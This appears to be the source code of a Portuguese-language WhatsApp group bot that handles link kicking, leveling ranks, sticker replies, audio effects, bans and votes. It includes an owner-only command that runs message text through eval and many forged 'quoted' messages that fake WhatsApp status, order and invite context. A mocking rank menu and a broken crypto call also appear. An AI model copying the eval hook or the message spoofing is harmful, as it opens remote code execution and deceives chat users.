   tomioka.updatePresence(from, Presence.composing)
   var kic = `${sender.split("@")[0]}@s.whatsapp.net`
      tomioka.groupRemove(from, [kic]).catch((e)=>{enviar(`*ERR:* ${e}`)})
}

/////***𝙁𝙐𝙉𝘾𝙏𝙄𝙊𝙉 𝘼𝙉𝙏𝙄 𝙇𝙄𝙉𝙆  𝙏𝙀𝙇𝙀𝙂𝙍𝘼𝙈***\\\\\
// @tio_tomioka_ofc
if (messagesC.includes("://t.me/")){
   if (!isGroup) return;
   if (!isAntiLink) return;
   if (isGroupAdmins) return; 
   tomioka.updatePresence(from, Presence.composing)
   var kic = `${sender.split("@")[0]}@s.whatsapp.net`
      tomioka.groupRemove(from, [kic]).catch((e)=>{enviar(`*ERR:* ${e}`)})
}
 //___________SISTEMA LEVELING AUTO____________//
 const sended = isGroup ? msg.participant : msg.key.remoteJid
 const nivelAtual = getLevelingLevel(sended)
             var patt = 'Bronze I🥉'
             if (nivelAtual === 1) {
                 patt = 'Bronze  I🥉'
             } else if (nivelAtual === 2) {
                 patt = 'Bronze II🥉'
             } else if (nivelAtual === 3) {
                 patt = 'Bronze  III🥉'
             } else if (nivelAtual === 4) {
                 patt = 'Bronze  IV🥉'
             } else if (nivelAtual === 5) {
                 patt = 'Bronze  V🥉'
             } else if (nivelAtual === 6) {
                 patt = 'Prata I🥈'
             } else if (nivelAtual === 7) {
                 patt = 'Prata II🥈'
             } else if (nivelAtual === 8) {
                 patt = 'Prata III🥈'
             } else if (nivelAtual === 9) {
                 patt = 'Prata IV🥈'
             } else if (nivelAtual === 10) {
                 patt = 'Prata V🥈'
             } else if (nivelAtual === 11) {
                 patt = 'Ouro I🥇'
             } else if (nivelAtual === 12) {
                 patt = 'Ouro II🥇'
             } else if (nivelAtual === 13) {
                 patt = 'Ouro III🥇'
             } else if (nivelAtual === 14) {
                 patt = 'Ouro IV🥇'
             } else if (nivelAtual === 15) {
                 patt = 'Ouro V🥇'
             } else if (nivelAtual === 16) {
                 patt = 'Campeão I🏆'
             } else if (nivelAtual === 17) {
                 patt = 'Campeão II🏆'
             } else if (nivelAtual === 18) {
                 patt = 'Campeão III🏆'
             } else if (nivelAtual === 19) {
                 patt = 'Campeão IV🏆'
             } else if (nivelAtual === 20) {
                 patt = 'Campeão V🏆'
             } else if (nivelAtual === 21) {
                 patt = 'Diamante I 💎'
             } else if (nivelAtual === 22) {
                 patt = 'Diamante II 💎'
             } else if (nivelAtual === 23) {
                 patt = 'Diamante III 💎'
             } else if (nivelAtual === 24) {
                 patt = 'Diamante IV 💎'
             } else if (nivelAtual === 25) {
                 patt = 'Diamante V 💎'
             } else if (nivelAtual === 26) {
                 patt = 'Mestre I 🐂'
             } else if (nivelAtual === 27) {
                 patt = 'Mestre II 🐂'
             } else if (nivelAtual === 28) {
                 patt = 'Mestre III 🐂'
             } else if (nivelAtual === 29) {
                 patt = 'Mestre IV 🐂'
             } else if (nivelAtual === 30) {
                 patt = 'Mestre V 🐂'
             } else if (nivelAtual === 31) {
                 patt = 'Mítico I 🔮'
             } else if (nivelAtual === 32) {
                 patt = 'Mítico II 🔮'
             } else if (nivelAtual === 33) {
                 patt = 'Mítico III 🔮'
             } else if (nivelAtual === 34) {
                 patt = 'Mítico IV 🔮'
             } else if (nivelAtual === 35) {
                 patt = 'Mítico V 🔮'
             } else if (nivelAtual === 36) {
                 patt = 'God I🕴'
             } else if (nivelAtual === 37) {
                 patt = 'God II🕴'
             } else if (nivelAtual === 38) {
                 patt = 'God III🕴'
             } else if (nivelAtual === 39) {
                 patt = 'God IV🕴'
             } else if (nivelAtual === 40) {
                 patt = 'God V🕴'
             } else if (nivelAtual >= 77777) {
                 patt = '*😈 𝗗𝗢𝗡𝗢 😈*'
             }
 
             //_TIPO DE USUÁRIO
             if (isOwner) {
                 var tuser =  '*😈 𝗗𝗢𝗡𝗢 😈*'
            } else if (isGroupAdmins) {
                 var tuser = '*Administrador 🔐*' 
             } else if (sender == isUser) {
                 var tuser = '*Registrado✅*'  
             } else {
                 var tuser = '*Membro comum🗿*'
             }            
             
             
         
             //_XP COM LEVELING ATIVO
                if (!msg.key.fromMe) {
                 if (isGroup && isLevelingOn) {
                     const currentLevel = getLevelingLevel(sended)
                     const checkId = getLevelingId(sended)
                     try {
                         if (currentLevel === undefined && checkId === undefined) addLevelingId(sended)
                         
                   
 const amountXp = Math.trunc(Math.random() * 20) * currentLevel         
                     const requiredXp = 7 * Math.round(currentLevel) * 13 * currentLevel 
                         const getLevel = getLevelingLevel(sended)
                         const namelv = checkId
                         addLevelingXp(sender, amountXp)
                         if (requiredXp <= getLevelingXp(sended)) {
                             addLevelingLevel(sended, 1)
                             const lvup = {
                                 text: `    ════❖LEVEL UP❖════
       ➣ Nome: @${namelv.split('@')[0]}
   ╭╼╾╼╾╼╾╼╾╼╾╼╾╼
   │➣ XP: ${getLevelingXp(sended)}/${requiredXp}
   │➣ Level: ${getLevel} -> ${getLevelingLevel(sended)}
   │➣ Patente: ${patt}
   ╰╼╾╼╾╼╾╼╾╼╾╼╾╼
   
    ════❖LEVEL UP❖════`,
                                 contextInfo: {
                                     mentionedJid: [namelv]
                                 }
                             }
                         tomioka.sendMessage(from, lvup, text, {quoted: msg})
                         }
                     } catch (err) {
                         console.error(err)
                     }
                 }
             }
//cores e quoteds
colors = ['red','white','black','blue','yellow','green']
const isMedia = (type === 'imageMessage' || type === 'videoMessage')
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
var ase = new Date();
var waktoonyabro = ase.getHours();
switch(waktoonyabro){
case 0: waktoonyabro = `Boa noite ${pushname}🌛`; break;
case 1: waktoonyabro = `Boa noite ${pushname}🌛`; break;
case 2: waktoonyabro = `Boa noite ${pushname}🌛`; break;
case 3: waktoonyabro = `Bom Dia ${pushname}✨`; break;
case 4: waktoonyabro = `Bom Dia ${pushname}✨`; break;
case 5: waktoonyabro = `Bom Dia ${pushname}✨`; break;
case 6: waktoonyabro = `Bom Dia ${pushname}✨`; break;
case 7: waktoonyabro = `Bom Dia ${pushname}✨`; break;
case 8: waktoonyabro = `Bom Dia ${pushname}✨`; break;
case 9: waktoonyabro = `Bom Dia ${pushname}✨`; break;
case 10: waktoonyabro = `Bom Dia ${pushname}✨`; break;
case 11: waktoonyabro = `Boa tarde ${pushname}🔥`; break;
case 12: waktoonyabro = `Boa tarde ${pushname}🔥`; break;
case 13: waktoonyabro = `Boa tarde ${pushname}🔥`; break;
case 14: waktoonyabro = `Boa tarde ${pushname}🔥`; break;
case 15: waktoonyabro = `Boa tarde ${pushname}🌹`; break;
case 16: waktoonyabro = `Boa tarde ${pushname}🌹`; break;
case 17: waktoonyabro = `Boa tarde ${pushname}🌹`; break;
case 18: waktoonyabro = `Boa tarde ${pushname}🌛`; break;
case 19: waktoonyabro = `Boa noite ${pushname}🌛`; break;
case 20: waktoonyabro = `Boa noite ${pushname}🌛`; break;
case 21: waktoonyabro = `Boa noite ${pushname}🌛`; break;
case 22: waktoonyabro = `Boa noite ${pushname}🌛`; break;
case 23: waktoonyabro = `Boa noite ${pushname}🌛`; break;
}
var ucapanFakeenviar = '' + waktoonyabro;
if (pushname === 5544988116479) {
   pushname = 'tomioka-bot'
  }
  if ((budy === 'AÉ') || (budy === 'Aé') || (budy === 'aé')) {
    tomioka.sendMessage(from, fs.readFileSync('./figurinhas/Aé.webp'), sticker, {contextInfo: null, quoted: msg})
}
      if ((budy === 'F') || (budy === 'F') || (budy === 'f')) {
    tomioka.sendMessage(from, fs.readFileSync('./figurinhas/F.webp'), sticker, {contextInfo: null, quoted: msg})
}
      if ((budy === 'QUE') || (budy === 'Que') || (budy === 'que')) {
    tomioka.sendMessage(from, fs.readFileSync('./figurinhas/Q.webp'), sticker, {contextInfo: null, quoted: msg})
}       
      if ((budy === 'OIBOT') || (budy === 'Oibot') || (budy === 'oibot')) {
    tomioka.sendMessage(from, fs.readFileSync('./figurinhas/oibot.webp'), sticker, {contextInfo: null, quoted: msg})  
}
      if ((budy === 'FRIO') || (budy === 'Frio') || (budy === 'frio')) {
    tomioka.sendMessage(from, fs.readFileSync('./figurinhas/frio.webp'), sticker, {contextInfo: null, quoted: msg})
}
      if ((budy === 'CALCULISTA') || (budy === 'Calculista') || (budy === 'calculista')) {
    tomioka.sendMessage(from, fs.readFileSync('./figurinhas/calculista.webp'), sticker, {contextInfo: null, quoted: msg})        
}
      if (msgReceived == "bom dia"){
    tomioka.sendMessage(from, fs.readFileSync('./figurinhas/dia.webp'), sticker, {contextInfo: null, quoted: msg})
}
      if (msgReceived == "boa noite"){
    tomioka.sendMessage(from, fs.readFileSync('./figurinhas/noite.webp'), sticker, {contextInfo: null, quoted: msg})
} 
      if ((budy === 'TOPE') || (budy === 'Tope') || (budy === 'tope')) {
    tomioka.sendMessage(from, fs.readFileSync('./figurinhas/tope.webp'), sticker, {contextInfo: null, quoted: msg})
}
      if ((budy === 'OI') || (budy === 'Oi') || (budy === 'oi')) {
    fakegroup (`oi '-'`)
}
      if ((budy === 'BAN') || (budy === 'Ban') || (budy === 'ban')) {
    tomioka.sendMessage(from, fs.readFileSync('./figurinhas/ban.webp'), sticker, {contextInfo: null, quoted: msg})
}
       if ((budy === 'TOOP') || (budy === 'Toop') || (budy === 'toop')) {
    tomioka.sendMessage(from, fs.readFileSync('./figurinhas/tudo.webp'), sticker, {contextInfo: null, quoted: msg})
}
      if ((budy === 'TOMIOKINHA') || (budy === 'Tomiokinha') || (budy === 'tomiokinha')) {
    tomioka.sendMessage(from, fs.readFileSync('./figurinhas/tomiokinha.webp'), sticker, {quoted: msg, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${waktoonyabro}`, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})  
}
      if (budy.match('ksks')) {
    tomioka.sendMessage(from, fs.readFileSync('./figurinhas/kkk.webp'), sticker, {quoted: msg, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${waktoonyabro}`, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})
}
      if (budy.match('monster')) {
    tomioka.sendMessage(from, fs.readFileSync('./figurinhas/monster.webp'), sticker, {quoted: msg, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${waktoonyabro}`, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})
}
//quoted
//tomioka
const ftroli2 ={key: {fromMe: false,participant:`0@s.whatsapp.net`,   remoteJid: `6289523258649-1604595598@g.us`  }, "message": {orderMessage: {itemCount: 10,status: 200, thumbnail: fs.readFileSync(`./me.jpg`), surface: 200, message: `Made with ❣️ `, orderTitle: 'tomioka', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
const foto = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '6283136505591-1614953337@g.us' } : {}) }, message: { 'imageMessage': { 'url': 'https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc', 'mimetype': 'image/png', 'caption': `tomioka`, 'fileSha256': '+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=', 'fileLength': '28777', 'height': 1080, 'width': 1079, 'mediaKey': 'vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=', 'fileEncSha256': 'sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=', 'directPath': '/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69', 'mediaKeyTimestamp': '1610993486', 'jpegThumbnail': fs.readFileSync(`./me.jpg`)} } }
const ctt = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}\n➢  ${command}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;tomioka,;;;\nFN:tomioka,\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync(`./me.jpg`), thumbnail:fs.readFileSync(`./me.jpg`),sendEphemeral: true}}}
const grupo = { key: {fromMe: false,participant: "0@s.whatsapp.net",remoteJid: "0@s.whatsapp.net"},message: {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "PINGHIN GAY","groupName": "tomioka", "caption": `tomioka-BOT️`, 'jpegThumbnail': fs.readFileSync(`./me.jpg`)}}}
const stik = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "stickerMessage": { "caption":`ola\n🪀comando: ${command}\n⏱horário: ${hr} `}}} 
const doc  = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: {"imageMessage": {"caption": `「 tomioka 」\n*${runtime(process.uptime())}*`, 'jpegThumbnail': fs.readFileSync('././me.jpg')}}}
const car ={"key": {   "fromMe": false,"participant":"0@s.whatsapp.net",   "remoteJid": "556293294732-1625944593@g.us"  }, "message": {orderMessage: {itemCount: 34,status: 200, thumbnail: fs.readFileSync(`./me.jpg`), surface: 200, message: `➢ Comando : ${command}`, orderTitle: 'sacole', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
//tomioka
const tomio = {
key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "60139571124@s.whatsapp.net" } : {})},message: {"productMessage": {"product": {"productImage":{"mimetype": "image/jpeg","jpegThumbnail": fs.readFileSync(`./me.jpg`)},"title": `${waktoonyabro}`,"description": `𝐜𝐨𝐦𝐚𝐧𝐝𝐨: ${command}\n⏱horário: ${hr} `, "currencyCode":`𝐜𝐨𝐦𝐚𝐧𝐝𝐨: ${command}`,"retailerId": "ɪ ᴀᴍ 𝑡𝑜𝑚𝑖𝑜𝑘𝑎 𝑏𝑜𝑡","productImageCount": 1},"businessOwnerJid": `0@s.whatsapp.net`}}}
const tome = {text: 'oi',"forwardingScore": 1000000000,isForwarded: true,sendEphemeral: true, "externalAdReply": {"title": `Canal do TIO TOMIOKA`,"body": "","previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./me.jpg`),"sourceUrl": `https://www.youtube.com/channel/UC8DcGKSSBm7kv2lXsjAmmMQ`},mentionedJid:[sender]} 
  if (!isGroup && isCmd) console.log(`\x1b[1;31m~\x1b[1;37m>${hr}`, color('[EXEC]'), color(pushname), color(`[NUMERO]`, 'orange'), color(sender.split('@')[0], 'pink'), color('COMANDO', 'white'), color('➤', 'red'), color(`[${command}]`, 'pink')) //exec em pv 
// console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'do mano', color(sender.split('@')[0]), 'args :', color(args.length))                                         
 if (!isGroup && !isCmd) console.log(`\x1b[1;31m~\x1b[1;37m>${hr}`, color(`[MSG]`, 'orange'), color(pushname, 'yellow'), color(`[NUMERO]`, 'orange'), color(sender.split('@')[0], 'blue')) //mensagem no pv 
// console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mRECV\x1b[1;37m]', time, color('Message'), 'do mano', color(sender.split('@')[0]), 'args :', color(args.length))
   if (isCmd && isGroup) console.log(`\x1b[1;31m~\x1b[1;37m>${hr}`, color('[EXEC]'), color(pushname), color(`[NUMERO]`, 'orange'), color(sender.split('@')[0], 'pink') ,color('COMANDO', 'white'), color('➤', 'red'), color(`[${command}]`, 'yellow'), color('NO GRUPO', 'white'), color(groupName)) //comando em grupo 
// console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'do mano', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
 if (!isCmd && isGroup) console.log(`\x1b[1;31m~\x1b[1;37m>${hr}`, color(`[MSG]`, 'orange'), color(pushname, 'yellow'), color(`[NUMERO]`, 'orange'), color(sender.split('@')[0], 'blue'), color(groupName)) //mensagem em grupo
// console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mRECV\x1b[1;37m]', time, color('Message'), 'do mano', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
let authorname = tomioka.contacts[from] != undefined ? tomioka.contacts[from].vname || tomioka.contacts[from].notify : undefined	
if (authorname != undefined) { } else { authorname = groupName }

if (budy.startsWith('=>')){
if (!isOwner) return enviar('somente meu criador')
var konsol = budy.slice(3)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined){
bang = util.format(sul)
}
return enviar(bang)
}
try {
enviar(util.format(eval(`;(async () => { ${konsol} })()`)))
console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color(">", "green"), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
} catch(e){
enviar(String(e))
}
}
if (msgReceived == "bagual"){
    const tmie = 'bla'
    tomioka.sendMessage(from, tmie,text, {quoted: car})  //ftroli2
}
switch(command) {
case 'rankes':
let temporalM = tomioka.prepareMessageFromContent(from,{
"listMessage": {
"title": "MENU DOS RANKS",
"description": "clique no botões abaixo e envie",
"buttonText": "clique aqui",
"listType": "SINGLE_SELECT",
"sections": [
{
"rows": [
{
"title": '🐂rank gados',
"rowId": `${prefix}rankgado`
},
{
"title": '🤩rank lindos',
"rowId": `${prefix}ranklindos`
},
{
"title": '🤢rank feios',
"rowId": `${prefix}rankfeios`
},
{
"title": '🏳️‍🌈rank gays',
"rowId": `${prefix}rankgay`
},
{
"title": '🤓rank betas',
"rowId": `${prefix}rankbeta`
},
{
"title": '🐺rank alfas',
"rowId": `${prefix}rankalfa`
},
{
"title": '🤡rank loucos',
"rowId": `${prefix}rankloucos`
},
{
"title": '💂‍♂️rank nazistas',
"rowId": `${prefix}ranknazista`
},
{
"title": '❤️suruba',
"rowId": `${prefix}suruba`
},
{
"title": 'surubão',
"rowId": `${prefix}surubao`
},
{
"title": '🌝rank iludidos',
"rowId": `${prefix}rankiludidos`
},
{
"title": '🤴🏻rank principes',
"rowId": `${prefix}rankprincipes`
},
{
"title": '👸🏻rank princesas',
"rowId": `${prefix}rankprincesas`
},
{
"title": '🐒rank camacos',
"rowId": `${prefix}rankcaco`
}
]
}
]                    
}
}, {quoted:tomioka})
tomioka.relayWAMessage(temporalM)
break
case 'ativo':

if (!isGroup) return enviar('só grupo')
if(groupIdscount.indexOf(from) < 0) return enviar('O bot não tem ainda dados sobre o grupo')
var ind = groupIdscount.indexOf(from)
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return enviar('Marque o número que deseja puxar a atividade')
mentioned = msg.message.extendedTextMessage.contextInfo.mentionedJid
if(numbersIds.indexOf(mentioned[0]) >= 0) {
var indnum = numbersIds.indexOf(mentioned[0])
mentions(`𖣘⃟ᗒ Consulta das atividade de\n𖣘⃟ᗒ @${mentioned[0].split('@')[0]} no grupo\n𖣘⃟ᗒ Mensagens: ${countMessage[ind].numbers[indnum].messages}\n𖣘⃟ᗒ Comandos dados: ${countMessage[ind].numbers[indnum].cmd_messages}`, mentioned, true)
}
else {
mentions(`⋆⃟ۣۜ᭪➣ Consulta da atividade de\n⋆⃟ۣۜ᭪➣ @${mentioned[0].split('@')[0]} no grupo\n⋆⃟ۣۜ᭪➣ Mensagens: 0\n⋆⃟ۣۜ᭪➣ Comandos dados: 0`, mentioned, true)
}
break
//_BANIR E DESBANIR USUARIO DE MEXER NO BOT 
case 'ban':
if (!isGroup) return enviar ('só grupo')
if (!isOwner) return enviar ('*Este comando só pode ser usado pelo o dono!* ')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return 
mentioned = msg.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
ban.push(`${mentioned}`)
fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
susp = `🚫@${mentioned[0].split('@')[0]} foi banido e ele não poderá mais usar comandos do bot🚫`
mentions(`${susp}`, mentioned, true)   
break

case 'unban':
if (!isGroup) return enviar ('só grupo')
if (!isOwner) return enviar ('*Este comando só pode ser usado pelo o dono!* ')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return 
mentioned = msg.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
ban.splice(`${mentioned}`)
fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
susp = `❎@${mentioned[0].split('@')[0]}foi desbloqueado e ele agora pode reutilizar os comandos do bot❎`
mentions(`${susp}`, mentioned, true)   
break
//_EFEITO NIGHTCORE PARA AUDIO         
case 'nightcore':
encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await tomioka.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return enviar ('Error!')
hah = fs.readFileSync(ran)
tomioka.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: msg})
fs.unlinkSync(ran)
})
break   

//_EFEITO SLOW PARA AUDIO
case 'slow':
low = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
slo = await tomioka.downloadAndSaveMediaMessage(low)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${slo} -filter:a "atempo=0.9,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(slo)
if (err) return enviar ('Error!')
hah = fs.readFileSync(ran)
tomioka.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: msg})
fs.unlinkSync(ran)
})
break

//_EFEITO ESQUILO PARA AUDIO
case 'esquilo':
pai = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
tup = await tomioka.downloadAndSaveMediaMessage(pai)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${tup} -filter:a "atempo=0.7,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(tup)
if (err) return enviar ('Error!')
hah = fs.readFileSync(ran)
tomioka.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: msg})
fs.unlinkSync(ran)
})
break

//_EFDEITO GIGANTE PARA AUDIO	
case 'gemuk':
muk = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
gem = await tomioka.downloadAndSaveMediaMessage(muk)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return enviar ('Error!')
hah = fs.readFileSync(ran)
tomioka.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: msg})
fs.unlinkSync(ran)
})
break

//_DEIXA O AUDIO RÁPIDO
case 'fast':
encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await tomioka.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a "atempo=0.9,asetrate=95100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return enviar ('Erro')
hah = fs.readFileSync(ran)
tomioka.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: msg})
fs.unlinkSync(ran)
})
break

//_AUMENTA O BASS DE UM AUDIO	
case 'bass':                 
ass = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
bas = await tomioka.downloadAndSaveMediaMessage(ass)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${bas} -af equalizer=f=20:width_type=o:width=2:g=15 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(bas)
if (err) return enviar ('Error!')
hah = fs.readFileSync(ran)
tomioka.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: msg})
fs.unlinkSync(ran)
})
break

//_DEIXA O AUDIO ESTOURADO		
case 'earrape':         
case 'estourar':       
ass = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
bas = await tomioka.downloadAndSaveMediaMessage(ass)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${bas} -af equalizer=f=90:width_type=o:width=2:g=50 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(bas)
if (err) return enviar ('Error!')
hah = fs.readFileSync(ran)
tomioka.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: msg})
fs.unlinkSync(ran)
})
break
/*case 'tts':
if (args.length < 1) return tomioka.sendMessage(from, 'Qual é o código da linguagem?', text, {quoted: msg})
const gtts = require('./lib/gtts')(args[0])
if (args.length < 2) return tomioka.sendMessage(from, 'Cadê o texto tio', text, {quoted: msg})
dtt = body.slice(9)
ranm = getRandom('.mp3')
rano = getRandom('.ogg')
dtt.length > 600
? enviar('A maior parte do texto não é nada')
: gtts.save(ranm, dtt, function() {
exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
fs.unlinkSync(ranm)
buff = fs.readFileSync(rano)
if (err) return enviar ('falha:(')
tomioka.sendMessage(from, buff, audio, {quoted: msg, ptt:true})
fs.unlinkSync(rano)
})
})
break*/
/*case '':
veri = sender
user.push(sender)
if (isUser) return;
fs.writeFileSync('./database/user.json', JSON.stringify(user))
const kentod2 = 

`
╭─「 *REGISTRO AUTOMÁTICO* 」
│Registro bem-sucedido com
│data e hora: ${time}
│Nome: ${pushname}
│Número: wa.me/${sender.split('@')[0]}
│Obrigado e use à vontade 😊
│❗Para usar o bot digite ${prefix}menu
│Total de usuários registrados: ${user.length}
╰──────────────────
`



tomioka.sendMessage(from, kentod2, MessageType.text, {quoted: tomio, contextInfo: tome})

break*/
case 'rg':
veri = sender
user.push(sender)
if (isUser) return;
fs.writeFileSync('./database/user.json', JSON.stringify(user))
const kentod = 

`
╭─「 *REGISTRO DO USUÁRIO* 」
│Registro bem-sucedido com
│data e hora: ${time}
│Nome: ${pushname}
│Número: wa.me/${sender.split('@')[0]}
│Obrigado e use à vontade 😊
│❗Para usar o bot digite ${prefix}menu
│Total de usuários registrados: ${user.length}
╰──────────────────
`



tomioka.sendMessage(from, kentod, MessageType.text, {quoted: tomio, contextInfo: tome})

break
//___________VOTAÇAO/VOTAR____________//
case 'delvote':

if(isvoting) return enviar('Sem sessão de votação')                  
delvote(delvote)
enviar('Sessão de votação excluída com sucesso neste grupo')
break
case 'vote':
if(!isGroup) return 
if (isVote) return enviar('ja tem uma votaçao ativa')
if(!q) return enviar('*Votaçao*\n\n'+ prefix+ 'vote @tag target | motivo | 1 (1 = 1 Minuto)')
if (msg.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 || msg.message.extendedTextMessage.contextInfo == null) {
let id = msg.message.extendedTextMessage.contextInfo.mentionedJid[0]
split = args.join(' ').replace('@', '').split('|')
if(!Number(split[2])) return enviar('insira um numero no parametro 3\nNumeraçao: 1-9999\n1 = 1 Minutos')
await mentions('Vote ' +'@'+ id.split('@')[0]+ '\n\n' + 'como fazer:' +'\n\n' + `votar = ✅\ndevote = ❌\n\nmotivo: ${split[1]}`,[id],true)
addVote(from,split[1],split[0],split[2],enviar)
let temporalF= tomioka.prepareMessageFromContent(from,{
"listMessage": {
"title": "✅VOTAÇÃO✅",
"description": "clique nos botões abaixo e envie",
"buttonText": "VOTAR",
"listType": "SINGLE_SELECT",
"sections": [
{
"rows": [
{
"title": 'SIM',
"rowId": ''
},
{
"title": 'NÃO',
"rowId": ''
}
]
}
]                    
}
}, {quoted:tomioka})
tomioka.relayWAMessage(temporalF)}
break
//figurinha menu stiker cmd stickercmd
case 'hash': 
if (!isOwner) return enviar ('*Este comando só pode ser usado pelo o dono!* ')
if (!isQuotedSticker) return enviar("Marque um sticker")
const encmeds9 = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
const mediastick = await tomioka.downloadMediaMessage(encmeds9)
var crypto = require('crypto')
hash = crypto.createStickerHash('sha256').update(mediastick).digest('base64');
console.log(hash)
enviar(hash)
break
case 'addcmd': 
case 'setcmd':
if (!isOwner && !msg.key.fromMe) return enviar('```so dono```')
if (isQuotedSticker) {
var kodenya = msg.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
addCmd(kodenya, q)
